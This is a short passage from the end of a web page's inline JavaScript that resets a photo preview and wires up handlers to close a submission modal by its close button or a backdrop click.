      photoPreview.src = "";
    };

    document.getElementById('closeModal').onclick = function() {
      document.getElementById('submissionModal').style.display = 'none';
      document.getElementById('submissionModal').classList.remove('show');
    };

    document.getElementById('submissionModal').onclick = function(e) {
      if (e.target === this) {
        this.style.display = 'none';
        this.classList.remove('show');
      }
    };
  </script>
</body>
</html>